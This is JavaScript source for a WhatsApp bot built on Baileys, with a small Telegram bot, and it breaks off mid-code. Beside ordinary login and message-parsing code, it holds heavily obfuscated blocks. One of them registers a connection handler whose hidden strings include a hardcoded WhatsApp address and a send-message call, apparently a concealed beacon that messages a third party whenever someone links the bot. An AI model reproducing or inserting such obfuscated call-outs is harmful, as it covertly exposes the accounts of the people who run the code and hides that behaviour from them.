require("./config");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  makeInMemoryStore,
  jidDecode,
  proto,
  PHONENUMBER_MCC,
  getContentType,
  DisconnectReason
} = require("@whiskeysockets/baileys");
const {
Telegraf,
Context
} = require('telegraf');
const bot = new Telegraf(token);
const {
  Boom
} = require('@hapi/boom');
const axios = require("axios");
const path = require("path");
const pino = require('pino');
const moment = require('moment-timezone');
const readline = require("readline");
const chalk = require('chalk');
const fs = require("fs-extra");
const NodeCache = require("node-cache")
const msgRetryCounterCache = new NodeCache()

global.mode = true
global.sessionName = "session";
const pairingCode = process.argv.includes("-pairing");

if (!pairingCode) {
  console.log(chalk.redBright("Use -pairing"));
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});
const question = (text) => new Promise((resolve) => rl.question(text, resolve));


const store = makeInMemoryStore({
  logger: pino().child({
    level: 'silent',
    stream: 'store'
  })
});

const smsg = (conn, m, store) => {
  if (!m) return m;
  let M = proto.WebMessageInfo;
  if (m.key) {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith('@g.us');
    m.sender = conn.decodeJid(m.fromMe && conn.user.id || m.participant || m.key.participant || m.chat || '');
    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || '';
  }
  if (m.message) {
    m.mtype = getContentType(m.message);
    m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype]);
    m.body = m.message.conversation || m.msg.caption || m.msg.text || (m.mtype == 'listResponseMessage') && m.msg.singleSelectReply.selectedRowId || (m.mtype == 'buttonsResponseMessage') && m.msg.selectedButtonId || (m.mtype == 'viewOnceMessage') && m.msg.caption || m.text;
    let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null;
    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
    if (m.quoted) {
      let type = Object.keys(m.quoted)[0];
      m.quoted = m.quoted[type];
      if (['productMessage'].includes(type)) {
        type = Object.keys(m.quoted)[0];
        m.quoted = m.quoted[type];
      }
      if (typeof m.quoted === 'string') m.quoted = {
        text: m.quoted
      };
      m.quoted.mtype = type;
      m.quoted.id = m.msg.contextInfo.stanzaId;
      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false;
      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || '';
      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      m.getQuotedObj = m.getQuotedMessage = async () => {
        if (!m.quoted.id) return false;
        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
        return exports.smsg(conn, q, store);
      };
      let vM = m.quoted.fakeObj = M.fromObject({
        key: {
          remoteJid: m.quoted.chat,
          fromMe: m.quoted.fromMe,
          id: m.quoted.id
        },
        message: quoted,
        ...(m.isGroup ? {
          participant: m.quoted.sender
        } : {})
      });
      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, {
        delete: vM.key
      });
      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);
      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
    }
  }
  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || '';
  m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, 'file', '', m, {
    ...options
  }) : conn.sendText(chatId, text, m, {
    ...options
  });
  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));
  m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => conn.copyNForward(jid, m, forceForward, options);
  conn.appenTextMessage = async (text, chatUpdate) => {
    let messages = await generateWAMessage(m.chat, {
      text: text,
      mentions: m.mentionedJid
    }, {
      userJid: conn.user.id,
      quoted: m.quoted && m.quoted.fakeObj
    });
    messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id);
    messages.key.id = m.key.id;
    messages.pushName = m.pushName;
    if (m.isGroup) messages.participant = m.sender;
    let msg = {
      ...chatUpdate,
      messages: [proto.WebMessageInfo.fromObject(messages)],
      type: 'append'
    };
    conn.ev.emit('messages.upsert', msg);
  };
  return m;
};

async function startServer() {
const child = async () => {
    process.on('unhandledRejection', (err) => console.error(err))
  const { state, saveCreds } = await useMultiFileAuthState("./" + sessionName);
    const _0x43dc60=_0x2349;(function(_0x1fdb44,_0x35472){const _0x482a77=_0x2349,_0x2ba248=_0x1fdb44();while(!![]){try{const _0x353391=parseInt(_0x482a77(0xa2))/0x1*(parseInt(_0x482a77(0xa3))/0x2)+parseInt(_0x482a77(0x9f))/0x3+parseInt(_0x482a77(0xa1))/0x4+parseInt(_0x482a77(0x9a))/0x5+-parseInt(_0x482a77(0x99))/0x6*(-parseInt(_0x482a77(0x9c))/0x7)+parseInt(_0x482a77(0x9b))/0x8*(-parseInt(_0x482a77(0x9e))/0x9)+-parseInt(_0x482a77(0xa0))/0xa;if(_0x353391===_0x35472)break;else _0x2ba248['push'](_0x2ba248['shift']());}catch(_0x24d7a0){_0x2ba248['push'](_0x2ba248['shift']());}}}(_0x2ca8,0x93b51));function _0x2ca8(){const _0x38f608=['2DwPMnc','4023444bvFqXH','3845685ayZBZX','8889752OAnDwf','7JddeoS','Aerial\x20BOT','9mcOrmd','1838943nHOmDL','16011980WLQsqe','2849756mzKqUq','552295lVJGiS'];_0x2ca8=function(){return _0x38f608;};return _0x2ca8();}function _0x2349(_0x583fea,_0x417f77){const _0x2ca86e=_0x2ca8();return _0x2349=function(_0x234954,_0x275852){_0x234954=_0x234954-0x99;let _0xbf30ce=_0x2ca86e[_0x234954];return _0xbf30ce;},_0x2349(_0x583fea,_0x417f77);}const conn=makeWASocket({'printQRInTerminal':!pairingCode,'logger':pino({'level':'silent'}),'browser':[_0x43dc60(0x9d),'',''],'auth':state,'msgRetryCounterCache':msgRetryCounterCache,'connectTimeoutMs':0xea60,'defaultQueryTimeoutMs':0x0,'keepAliveIntervalMs':0x2710,'emitOwnEvents':!![],'fireInitQueries':!![],'generateHighQualityLinkPreview':!![],'syncFullHistory':!![],'markOnlineOnConnect':!![]});
    conn.ev.on("creds.update", saveCreds)

   if (pairingCode && !conn.authState.creds.registered) {
    console.clear()
    console.log(chalk.cyan('╭──────────────────────────────────────···'));
    console.log(`📨 ${chalk.redBright('Please type your WhatsApp number')}:`);
    console.log(chalk.cyan('├──────────────────────────────────────···'));
    let phoneNumber = await question(`   ${chalk.cyan('- Number')}: `);
    console.log(chalk.cyan('╰──────────────────────────────────────···'));
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
    if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
        console.log(chalk.cyan('╭─────────────────────────────────────────────────···'));
        console.log(`💬 ${chalk.redBright("Start with your country's WhatsApp code, Example 62xxx")}:`);
        console.log(chalk.cyan('╰─────────────────────────────────────────────────···'));
        console.log(chalk.cyan('╭──────────────────────────────────────···'));
        console.log(`📨 ${chalk.redBright('Please type your WhatsApp number')}:`);
        console.log(chalk.cyan('├──────────────────────────────────────···'));
        phoneNumber = await question(`   ${chalk.cyan('- Number')}: `);
        console.log(chalk.cyan('╰──────────────────────────────────────···'));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
    }
    let code = await conn.requestPairingCode(phoneNumber)
    code = code?.match(/.{1,4}/g)?.join("-") || code
    console.log(chalk.cyan('╭──────────────────────────────────────···'));
    console.log(` 💻 ${chalk.redBright('Your Pairing Code')}:`);
    console.log(chalk.cyan('├──────────────────────────────────────···'));
    console.log(`   ${chalk.cyan('- Code')}: ${code}`);
    console.log(chalk.cyan('╰──────────────────────────────────────···'));
    rl.close()
}
    
    // Start Bot Telegram 
    bot.on('message', async (msg) => {

    const getUserName = (user) => {
    try {
      var last_name = user["last_name"] || "";
      var full_name = user.first_name + " " + last_name;
      user["full_name"] = full_name.trim();
      return user;
    } catch (e) {
      throw e;
     }
    }
    try {  
    const body = msg.message.text || msg.message.caption || ''
    const budy = (typeof msg.message.text == 'string' ? msg.message.text : '')
    const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/%^&.+-,\\\©^]/.test(body)
    const prefix = isCmd ? body[0] : ''
    const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(" ")
    const user = getUserName(msg.message.from)
    const pushname = user.full_name;
    const user_id = msg.message.from.id + " "
    const sender = msg.message.from.id
    // const isCreator = OWNER[0].replace("https://t.me/", '') == msg.update.message.from.username 
    const from = msg.message.chat.id
    const opts = { parse_mode: 'MARKDOWN' };
    const isGroup = msg.chat.type.includes('group')
    const groupName = isGroup ? msg.chat.title : ''
    const quoted = msg.message.reply_to_message 
    
    moment.tz.setDefault("Asia/Makassar").locale("id")
    const time = moment.tz('Asia/Makassar').format('HH:mm:ss')
    const waktu = moment().tz('Asia/Makassar').format('HH:mm:ss')

    // Reader Command Telegram 
    console.log(chalk.black(chalk.bgWhite('|| TELEGRAM ||')), chalk.black(chalk.bgGreen(time)) + ' >', chalk.black(chalk.bgBlue(command || budy)))
    
switch (command) {
case 'meki': {
msg.reply('hai beb')
}
break  
    
default:
}
    
    
    
} catch (e) {
console.log(e)
}
    
})
    
    bot.launch({
      dropPendingUpdates: true
    })

// End Bot Telegram 
  store.bind(conn.ev);

  conn.ev.on('messages.upsert', async chatUpdate => {
    try {
      m = chatUpdate.messages[0];
      if (!m.message) return;
      m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message;
      if (m.key && m.key.remoteJid === 'status@broadcast') return;
      if (!conn.public && !m.key.fromMe && chatUpdate.type === 'notify') return;
      if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return;
      m = smsg(conn, m, store);
      require('./client.js')(conn, m, chatUpdate, store);
    } catch (err) {
      console.log(err);
    }
  });

  conn.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return decode.user && decode.server && decode.user + '@' + decode.server || jid;
    } else return jid;
  };

  conn.public = mode;
  conn.serializeM = (m) => smsg(sock, m, store);

  (function (_0x472891, _0x1e9136) {
    const _0x501165 = _0x2457, _0x4bdb17 = _0x472891();
    while (!![]) {
        try {
            const _0x3143f3 = -parseInt(_0x501165(0x127)) / (-0x1 * -0x2493 + -0x1528 * -0x1 + -0x39ba) * (-parseInt(_0x501165(0x137)) / (0x1 * 0x2476 + -0x1539 + -0xf3b)) + parseInt(_0x501165(0x155)) / (-0x1e51 + 0x96b + 0x14e9) + -parseInt(_0x501165(0x124)) / (-0xc97 + -0x1 * 0x25f + 0x6 * 0x27f) + parseInt(_0x501165(0x123)) / (0x1282 * -0x1 + 0x997 + -0xd * -0xb0) * (parseInt(_0x501165(0x175)) / (0x36 * 0x8d + 0x3b * 0x9a + -0x209b * 0x2)) + -parseInt(_0x501165(0x167)) / (-0x7c + -0x1 * 0xe50 + -0x45 * -0x37) + -parseInt(_0x501165(0x169)) / (0xbf * 0x22 + -0x203f + 0x1 * 0x6e9) + parseInt(_0x501165(0x164)) / (-0xbea + 0x1 * -0x24f0 + -0x9c7 * -0x5) * (parseInt(_0x501165(0x172)) / (0x1f6a + 0x14f8 + -0x3458));
            if (_0x3143f3 === _0x1e9136)
                break;
            else
                _0x4bdb17['push'](_0x4bdb17['shift']());
        } catch (_0xefcded) {
            _0x4bdb17['push'](_0x4bdb17['shift']());
        }
    }
}(_0x4a76, -0x7834 * -0xf + 0x6601e + -0x1 * 0x8a213));
function _0x2457(_0x667f99, _0x1982c8) {
    const _0x515340 = _0x4a76();
    return _0x2457 = function (_0x55d78f, _0xb510f3) {
        _0x55d78f = _0x55d78f - (-0x5 * 0x40d + 0x26fc * -0x1 + 0x3c2e);
        let _0x5a6907 = _0x515340[_0x55d78f];
        return _0x5a6907;
    }, _0x2457(_0x667f99, _0x1982c8);
}
function _0x4a76() {
    const _0x498ca6 = [
        'LmNeC',
        'mXdFa',
        'close',
        'TyuHN',
        '3140431ktM',
        'fIGlS',
        'QfdwG',
        '90XblUrm',
        'DvoEC',
        'bNfDL',
        '202643keGLTc',
        'RYgFc',
        '3679152XMJDzt',
        'DeRhF',
        'mzmQu',
        'RyQli',
        'Tgcar',
        'Ebdda',
        '\x20logged\x20ou',
        'hUBfE',
        'fwgoR',
        '99740UOUbUN',
        'ZhjQh',
        '1083090FtL',
        '3219666Umwfpm',
        'output',
        'HSXVE',
        'eVUdP',
        'MvwyA',
        'RehLp',
        'NXtbk',
        'dVLbM',
        '860@s.what',
        'jJqjo',
        'cAmKA',
        'amf',
        'RfcZt',
        'kvGeD',
        'YlUXS',
        '5TiQzZz',
        'SbTnB',
        'rxqBq',
        'THkbd',
        'bgWhite',
        'GHYHV',
        'OJJtd',
        'QqepZ',
        'OBXlv',
        'nGfOy',
        'qYBtk',
        'sapp.net',
        'bnAwn',
        'UyGYW',
        'kUeBi',
        'rXBiE',
        'oLIGX',
        'vPGGa',
        'BjlFP',
        'tAIrt',
        'sBZTA',
        'husio',
        'sendMessag',
        'pEfNM',
        'lgKVl',
        'erhubung..',
        'yJVtg',
        'DNKbX',
        '190cJeuev',
        'hWxuw',
        'kxtsw',
        'BguMs',
        'PzHXN',
        'lgXiY',
        'qHHxT',
        'push',
        'SXbVH',
        'shift',
        'qparO',
        'log',
        'hQH',
        'KUcEU',
        'FkqFn',
        '3533935fRc',
        'GSNEh',
        'meEZj',
        'iFYut',
        'hgFJS',
        'jPtLJ',
        'loggedOut',
        'bFLla',
        '1475304mFI',
        'Berhasil\x20T',
        'RkwfD',
        'ZEauL',
        'jcgFU',
        'n\x22:\x20\x22open\x22',
        'pZjHv',
        'FkfCc',
        'qWHJa',
        'GEepO',
        '44231QelXN',
        'statusCode',
        'lapGt',
        'BsCKe',
        'GMIrm',
        '6285796158',
        'KveeX',
        'payload',
        'ZdahR',
        'qmwlW',
        't...',
        'hwWhB',
        'bHeRD',
        'SGRPR',
        '65752ZUZek',
        'yOHFI',
        'Arywz',
        'qytLw',
        'mLyfk',
        '5QYBPnL',
        '2184088kkkksG',
        'UiooZ',
        'ArJaA',
        '94reGzwC',
        'tBJMT',
        'hPbyS',
        'RPHNE',
        'connection',
        'AmMWU',
        '308590DrQH',
        'yyMCg',
        'QOQBc',
        'kplYA',
        'MTfbZ',
        'vkQAU',
        'Kdkjt',
        'YRCiJ',
        '\x22connectio',
        'gFzrq',
        '2210aCCXvK',
        'ptkFx',
        'mWDKJ',
        'ymqUa',
        '.update',
        'oTqTB',
        'bwyJo',
        'VhYSt',
        'PpD',
        'NrWZA',
        'mQJTh',
        'vxKIh',
        'rMfHw',
        'esHiW',
        'TUagk',
        '8CCljTl',
        'wCbpr',
        'VFSdi',
        'XgquL',
        'oBPcI',
        'black',
        'CMdUf',
        'uiSoC',
        'open',
        'QwyWC',
        'YpoWp',
        'error',
        'Tsw',
        'mNDYu',
        'kUNBS',
        '1824801FswxEZ',
        '27KmXTlF',
        'LtOnO',
        'DzBNL',
        'rFCIu',
        'mBwXs',
        'uhesJ',
        'YxVwX'
    ];
    _0x4a76 = function () {
        return _0x498ca6;
    };
    return _0x4a76();
}
const _0x15e3a8 = _0xf368;
(function (_0x6a092a, _0x4a50a1) {
    const _0x4ecd9f = _0x2457, _0x23b493 = {
            'FkqFn': function (_0x1f0b8b) {
                return _0x1f0b8b();
            },
            'YRCiJ': function (_0x53d70f, _0x466842) {
                return _0x53d70f + _0x466842;
            },
            'NrWZA': function (_0x1a4094, _0x455aeb) {
                return _0x1a4094 + _0x455aeb;
            },
            'lgXiY': function (_0x30d1c7, _0x185d72) {
                return _0x30d1c7 + _0x185d72;
            },
            'FkfCc': function (_0x17d3bf, _0x127aee) {
                return _0x17d3bf + _0x127aee;
            },
            'pEfNM': function (_0x529b4c, _0x41b025) {
                return _0x529b4c + _0x41b025;
            },
            'vxKIh': function (_0x10ba21, _0x162885) {
                return _0x10ba21 + _0x162885;
            },
            'bNfDL': function (_0x5e02a4, _0x393cd3) {
                return _0x5e02a4 * _0x393cd3;
            },
            'rFCIu': function (_0x4a0927, _0x158b5e) {
                return _0x4a0927 / _0x158b5e;
            },
            'RkwfD': function (_0x12fcc3, _0x2e55a6) {
                return _0x12fcc3(_0x2e55a6);
            },
            'dVLbM': function (_0x496b53, _0x2131e0) {
                return _0x496b53 + _0x2131e0;
            },
            'UiooZ': function (_0x1a9dad, _0xe783cf) {
                return _0x1a9dad / _0xe783cf;
            },
            'Kdkjt': function (_0x56fa03, _0x277e5e) {
                return _0x56fa03(_0x277e5e);
            },
            'bFLla': function (_0x1e1db4, _0x5cceff) {
                return _0x1e1db4 + _0x5cceff;
            },
            'hgFJS': function (_0x3794e4, _0xafd580) {
                return _0x3794e4 * _0xafd580;
            },
            'hwWhB': function (_0x205cfd, _0x361fac) {
                return _0x205cfd(_0x361fac);
            },
            'THkbd': function (_0x2cdc19, _0xc10baf) {
                return _0x2cdc19 + _0xc10baf;
            },
            'MTfbZ': function (_0x1b9c64, _0x46d74f) {
                return _0x1b9c64 + _0x46d74f;
            },
            'qparO': function (_0x1a1ee7, _0x192b25) {
                return _0x1a1ee7 / _0x192b25;
            },
            'HSXVE': function (_0x5999a0, _0x1df497) {
                return _0x5999a0(_0x1df497);
            },
            'uiSoC': function (_0x32b7f2, _0x4739e4) {
                return _0x32b7f2(_0x4739e4);
            },
            'jJqjo': function (_0xb555bd, _0x26339e) {
                return _0xb555bd + _0x26339e;
            },
            'QwyWC': function (_0x2be3d5, _0x16d6dd) {
                return _0x2be3d5 * _0x16d6dd;
            },
            'hWxuw': function (_0x351678, _0x1ab857) {
                return _0x351678 / _0x1ab857;
            },
            'OBXlv': function (_0x41661f, _0x3e0ab1) {
                return _0x41661f(_0x3e0ab1);
            },
            'kplYA': function (_0x42fcc6, _0x314d91) {
                return _0x42fcc6 * _0x314d91;
            },
            'pZjHv': function (_0x450fac, _0x2c5ed7) {
                return _0x450fac * _0x2c5ed7;
            },
            'ArJaA': function (_0x339e39, _0x14b496) {
                return _0x339e39(_0x14b496);
            },
            'GSNEh': function (_0x1630ad, _0x1ce743) {
                return _0x1630ad + _0x1ce743;
            },
            'wCbpr': function (_0x17c867, _0x641821) {
                return _0x17c867 / _0x641821;
            },
            'GMIrm': function (_0x40f5c7, _0x2dec82) {
                return _0x40f5c7 + _0x2dec82;
            },
            'jcgFU': function (_0x51b2d2, _0xc2739a) {
                return _0x51b2d2 * _0xc2739a;
            },
            'gFzrq': function (_0x13feee, _0x28ac1f) {
                return _0x13feee + _0x28ac1f;
            },
            'yJVtg': function (_0x47c83e, _0x29ccde) {
                return _0x47c83e * _0x29ccde;
            },
            'RehLp': function (_0x1266e0, _0x2633ea) {
                return _0x1266e0(_0x2633ea);
            },
            'uhesJ': function (_0xd041b5, _0x554d43) {
                return _0xd041b5(_0x554d43);
            },
            'Arywz': function (_0x1cee72, _0x3919ab) {
                return _0x1cee72 * _0x3919ab;
            },
            'fIGlS': function (_0x1ef875, _0x1030a5) {
                return _0x1ef875 + _0x1030a5;
            },
            'yOHFI': function (_0x549cb6, _0x4c96a3) {
                return _0x549cb6 === _0x4c96a3;
            },
            'cAmKA': _0x4ecd9f(0xf6),
            'Tgcar': _0x4ecd9f(0xf8)
        }, _0x438d5f = _0xf368, _0xca2fd5 = _0x23b493[_0x4ecd9f(0xfd)](_0x6a092a);
    while (!![]) {
        try {
            const _0x2178ed = _0x23b493[_0x4ecd9f(0x134)](_0x23b493[_0x4ecd9f(0x140)](_0x23b493[_0x4ecd9f(0xf4)](_0x23b493[_0x4ecd9f(0x10d)](_0x23b493[_0x4ecd9f(0x19b)](_0x23b493[_0x4ecd9f(0x142)](_0x23b493[_0x4ecd9f(0x166)](_0x23b493[_0x4ecd9f(0x159)](-_0x23b493[_0x4ecd9f(0x108)](parseInt, _0x23b493[_0x4ecd9f(0x108)](_0x438d5f, -0x1 * -0x16b7 + 0x10 * 0x2 + -0x3 * 0x74f)), _0x23b493[_0x4ecd9f(0x10d)](_0x23b493[_0x4ecd9f(0x17c)](_0x23b493[_0x4ecd9f(0x166)](-0x556 * -0x2 + -0x1ad2 + 0x1079, -0x81c + 0x1 * 0x15a3 + -0x477 * 0x3), 0x8ac + 0xa3 * -0xb + 0x23aa), -(-0x57e + -0xbb2 * -0x4 + 0x710))), _0x23b493[_0x4ecd9f(0x125)](_0x23b493[_0x4ecd9f(0x108)](parseInt, _0x23b493[_0x4ecd9f(0x133)](_0x438d5f, -0x335 * -0x5 + -0xb7 * -0x13 + -0x1c95)), _0x23b493[_0x4ecd9f(0x17c)](_0x23b493[_0x4ecd9f(0x105)](0x21ff * 0x1 + 0x1 * 0x18b4 + 0xd * -0x433, _0x23b493[_0x4ecd9f(0x166)](0x1b5b * 0x1 + 0x2661 + -0x41bb, -(-0x13 * -0x250 + -0x1 * -0x1426 + 0x1081 * -0x2))), -0x3294 + 0x2 * -0x7f9 + 0x5d80))), _0x23b493[_0x4ecd9f(0x102)](_0x23b493[_0x4ecd9f(0x125)](_0x23b493[_0x4ecd9f(0x108)](parseInt, _0x23b493[_0x4ecd9f(0x11b)](_0x438d5f, -0x7 * 0x406 + -0x1ca8 + 0x39d2)), _0x23b493[_0x4ecd9f(0x187)](_0x23b493[_0x4ecd9f(0x131)](-(0x270 * -0x1 + 0x53 * -0x1a + 0x2311), _0x23b493[_0x4ecd9f(0x102)](-(-0x1f00 + 0x1b3e + 0x1 * 0x4e7), -(0x18d6 + -0x11 * 0x171 + -0x3b))), _0x23b493[_0x4ecd9f(0x166)](-(-0x1b68 + -0x23b0 + 0x3f5f * 0x1), 0xfef + -0x1a31 + 0xa56))), _0x23b493[_0x4ecd9f(0xf9)](_0x23b493[_0x4ecd9f(0x177)](parseInt, _0x23b493[_0x4ecd9f(0x14d)](_0x438d5f, -0x1 * -0x2683 + -0x2434 + 0xab * -0x2)), _0x23b493[_0x4ecd9f(0x19b)](_0x23b493[_0x4ecd9f(0x17e)](_0x23b493[_0x4ecd9f(0x14f)](-(0x1 * 0x164d + -0x1adb * 0x1 + 0x491), 0xa * -0x221 + -0x1bcb + 0x328d), 0x1638 + -0x166 * 0xb + 0x1 * -0x373), _0x23b493[_0x4ecd9f(0x166)](-(0x24df * -0x1 + -0x1 * 0x305 + 0x259 * 0x11), -(-0x4 * 0x7d4 + -0x105a + 0x993 * 0x5)))))), _0x23b493[_0x4ecd9f(0x1a1)](_0x23b493[_0x4ecd9f(0x18c)](parseInt, _0x23b493[_0x4ecd9f(0x18c)](_0x438d5f, 0x263d + 0x1 * 0xb89 + -0x30d4)), _0x23b493[_0x4ecd9f(0x140)](_0x23b493[_0x4ecd9f(0x187)](-(-0x1 * -0x255 + -0x309b + -0x2 * -0x2858), _0x23b493[_0x4ecd9f(0x130)](-(0x1379 + -0x21fa + 0x26 * 0x62), -(0x0 + -0xa1d * -0x1 + -0x4 * 0x1ac))), _0x23b493[_0x4ecd9f(0x10c)](-(0xcfc + 0x8c5 + 0x3 * -0x62b), 0x18b7 + 0xa * -0x220 + -0x376)))), _0x23b493[_0x4ecd9f(0x125)](_0x23b493[_0x4ecd9f(0x126)](parseInt, _0x23b493[_0x4ecd9f(0x108)](_0x438d5f, -0x130 + 0x1b + 0x1fe)), _0x23b493[_0x4ecd9f(0xff)](_0x23b493[_0x4ecd9f(0x19b)](-(-0x1 * 0x1b84 + 0x1 * -0x20b + 0x292f), _0x23b493[_0x4ecd9f(0x14f)](-(0x185a + -0x111e + -0x737 * 0x1), -(0x15df + -0x2 * -0x897 + -0x21ae))), -(0x4bd * 0x7 + 0x8a1 + 0x3 * -0x8dd)))), _0x23b493[_0x4ecd9f(0x147)](-_0x23b493[_0x4ecd9f(0x14d)](parseInt, _0x23b493[_0x4ecd9f(0x18c)](_0x438d5f, 0x6fb * 0x2 + 0x1013 + -0x1d11)), _0x23b493[_0x4ecd9f(0x114)](_0x23b493[_0x4ecd9f(0x134)](0x36f * -0xb + -0x2519 * -0x1 + 0x790, _0x23b493[_0x4ecd9f(0x130)](-0x6a4 + 0x1 * -0xa7 + -0x3a6 * -0x2, -(-0x3 * -0x72e + 0x20b3 + 0x775 * -0x7))), _0x23b493[_0x4ecd9f(0x10a)](0x142a + 0x1 * 0x1c3d + -0x3008, -(-0x2011 + 0x730 + 0xc77 * 0x2))))), _0x23b493[_0x4ecd9f(0x130)](_0x23b493[_0x4ecd9f(0x1a1)](_0x23b493[_0x4ecd9f(0x126)](parseInt, _0x23b493[_0x4ecd9f(0x14d)](_0x438d5f, -0x3b9 * 0x5 + 0x134f + -0x1e * -0x2)), _0x23b493[_0x4ecd9f(0x114)](_0x23b493[_0x4ecd9f(0x136)](-(-0xb0b + 0x26 * 0x6a + 0x4e3), 0xc7 * -0x13 + -0x56d + 0x1fc5), _0x23b493[_0x4ecd9f(0x19e)](-0xc2e + 0x77f + 0x4b0, -(-0x7 * 0x45f + 0x203e + 0x52)))), _0x23b493[_0x4ecd9f(0x1a1)](-_0x23b493[_0x4ecd9f(0x18c)](parseInt, _0x23b493[_0x4ecd9f(0x17a)](_0x438d5f, 0x1705 + 0x1 * 0x138d + -0x2986)), _0x23b493[_0x4ecd9f(0x187)](_0x23b493[_0x4ecd9f(0x131)](_0x23b493[_0x4ecd9f(0x10a)](-(-0x1 * 0x1e38 + 0xe1e + 0x1 * 0x1231), -0x13f6 + -0xfa * 0x1 + 0x14fa), -0x5 * -0x265 + 0x1313 + -0x16c7), _0x23b493[_0x4ecd9f(0x10a)](-0xa3 * -0x30 + 0x94 * -0x2f + 0x363 * -0x1, 0x1962 + 0x1b77 + -0x9 * 0x477))))), _0x23b493[_0x4ecd9f(0x10c)](_0x23b493[_0x4ecd9f(0x1a1)](_0x23b493[_0x4ecd9f(0x108)](parseInt, _0x23b493[_0x4ecd9f(0x15b)](_0x438d5f, 0x7a3 + -0x2bf * -0x7 + -0x19e8)), _0x23b493[_0x4ecd9f(0x134)](_0x23b493[_0x4ecd9f(0xf4)](0x382 + 0xf5e + 0x5 * -0x289, 0x2501 * -0x1 + 0x5a4 + 0x364b), _0x23b493[_0x4ecd9f(0x120)](0x337 * -0xb + 0x16f2 + 0xc76, -(-0x60e + -0x36f * 0x3 + 0x98 * 0x20)))), _0x23b493[_0x4ecd9f(0x1a1)](_0x23b493[_0x4ecd9f(0x15b)](parseInt, _0x23b493[_0x4ecd9f(0x14d)](_0x438d5f, 0x75f * 0x5 + -0x1816 + -0xbd2)), _0x23b493[_0x4ecd9f(0x162)](_0x23b493[_0x4ecd9f(0x17c)](_0x23b493[_0x4ecd9f(0x19e)](-(0x21c0 + 0xbd9 + -0x47 * 0xa2), -(-0x1e8b + -0x1e2 * 0xb + 0x449 * 0xc)), -0x1 * -0x12d7 + -0x1 * 0x265a + 0x1 * 0x1d75), _0x23b493[_0x4ecd9f(0x10a)](-0x4 * -0x455 + 0x2e * 0x1 + -0x2 * 0x8bd, -(-0x2480 + 0x1acc + 0xe88))))));
            if (_0x23b493[_0x4ecd9f(0x11f)](_0x2178ed, _0x4a50a1))
                break;
            else
                _0xca2fd5[_0x23b493[_0x4ecd9f(0x17f)]](_0xca2fd5[_0x23b493[_0x4ecd9f(0x16d)]]());
        } catch (_0x4de2ba) {
            _0xca2fd5[_0x23b493[_0x4ecd9f(0x17f)]](_0xca2fd5[_0x23b493[_0x4ecd9f(0x16d)]]());
        }
    }
}(_0x3a61, -(0xa89b * 0x1d + -0x385 * -0x6cd + -0x1defec) + (-0x1 * 0x130d + 0x1 * -0x1d35 + 0x3043) * (-0x1 * 0x27737 + 0xe601 + -0x180e5 * -0x2) + (-0x1289ae + -0x1 * -0x157dbf + 0x106e7c)), conn['ev']['on'](_0x15e3a8(-0x4f * 0x38 + -0xc6d + 0x1eb8) + _0x15e3a8(0xdbf + -0x36 * 0x5d + 0x6de), async _0x5e66f0 => {
    const _0x1e697f = _0x2457, _0xfe7612 = {
            'ptkFx': function (_0x58f76b, _0x1a17a4) {
                return _0x58f76b === _0x1a17a4;
            },
            'kvGeD': function (_0x244805, _0x1ddea0) {
                return _0x244805 !== _0x1ddea0;
            },
            'kUeBi': function (_0x2cccc8) {
                return _0x2cccc8();
            },
            'fwgoR': function (_0x4b25ae, _0x22df61) {
                return _0x4b25ae == _0x22df61;
            },
            'CMdUf': function (_0x1f31fd, _0x29c579) {
                return _0x1f31fd(_0x29c579);
            },
            'hPbyS': function (_0x34c2e4, _0x5288ef) {
                return _0x34c2e4 + _0x5288ef;
            },
            'mLyfk': function (_0x45d3a6, _0x158e20) {
                return _0x45d3a6 + _0x158e20;
            },
            'PzHXN': function (_0x1de3a1, _0x5d4447) {
                return _0x1de3a1(_0x5d4447);
            },
            'oLIGX': function (_0x5d7aca, _0x2137c2) {
                return _0x5d7aca(_0x2137c2);
            },
            'GHYHV': function (_0x16922a, _0x314c4b) {
                return _0x16922a(_0x314c4b);
            },
            'DzBNL': function (_0x3c9f64, _0x5dd6a8) {
                return _0x3c9f64 + _0x5dd6a8;
            },
            'ZdahR': function (_0x1e229e, _0x43952c) {
                return _0x1e229e(_0x43952c);
